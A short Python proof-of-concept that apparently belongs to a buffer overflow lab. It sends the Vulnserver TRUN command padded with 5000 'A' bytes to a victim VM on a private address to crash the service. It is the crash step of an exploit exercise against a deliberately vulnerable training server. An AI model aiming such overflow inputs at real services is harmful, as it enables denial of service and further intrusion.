import socket

ip = "192.168.56.101"       # IP of the victim machine
port = 9999                 # Vulnserver's port 
buff = b"TRUN /.:/"         # TRUN command for Vulnserver
buff += b"A" * 5000         # Buffer filled with A's to crash the server.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print(s.recv(1024).decode('utf-8'))
s.send(buff)
s.close()


